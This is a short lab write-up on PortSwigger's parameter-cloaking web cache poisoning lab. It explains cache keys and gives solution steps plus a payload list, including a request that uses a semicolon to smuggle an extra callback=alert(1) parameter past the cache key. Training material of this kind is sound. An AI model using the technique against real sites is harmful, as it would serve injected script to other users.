# Lab: Parameter cloaking

**Official PortSwigger URL:** https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-param-cloaking

**Lab idea:** This lab focuses on inconsistent parameter parsing between the cache and the application, including an excluded analytics parameter. It practices reasoning about how apparently grouped or hidden query data can be treated differently by each component.

## Vulnerability in brief
Web cache poisoning is a vulnerability in which an attacker causes a cache to store a harmful HTTP response and then serves that response to other users. In general, the attack requires both an input that changes the back-end response and a way to have the resulting response cached. A cache identifies requests using a cache key, usually a subset of request components; inputs omitted from that key are unkeyed. If an unkeyed value influences the response, the cache may treat a harmful response as interchangeable with a normal one. [PortSwigger's topic guide](https://portswigger.net/web-security/web-cache-poisoning)

## Solution idea
1. Identify that the utm_content parameter is supported.
2. Notice that if you use a semicolon ( ; ) to append another parameter to utm_content , the cache treats this as a single parameter.
3. Observe that every page imports the script /js/geolocate.js , executing the callback function setCountryCookie() .
4. Notice that you can control the name of the function that is called on the returned data by editing the callback parameter.
5. Study the cache behavior.
6. Send the request again, but this time pass in alert(1) as the callback function: GET /js/geolocate.js?callback=setCountryCookie&utm_content=foo;callback=alert(1)
7. Get the response cached, then load the home page in the browser.
8. Replay the request to keep the cache poisoned.

## Payloads / key values
- `utm_content`
- `;`
- `/js/geolocate.js`
- `setCountryCookie()`
- `GET /js/geolocate.js?callback=setCountryCookie`
- `callback`
- `GET /js/geolocate.js?callback=setCountryCookie&utm_content=foo;callback=arbitraryFunction HTTP/1.1 200 OK X-Cache-Key: /js/geolocate.js?callback=setCountryCookie … arbitraryFunction({"country" : "United Kingdom"})`
- `alert(1)`
- `GET /js/geolocate.js?callback=setCountryCookie&utm_content=foo;callback=alert(1)`
- `alert()`

## Official source
- [PortSwigger Academy: Lab: Parameter cloaking](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-param-cloaking)
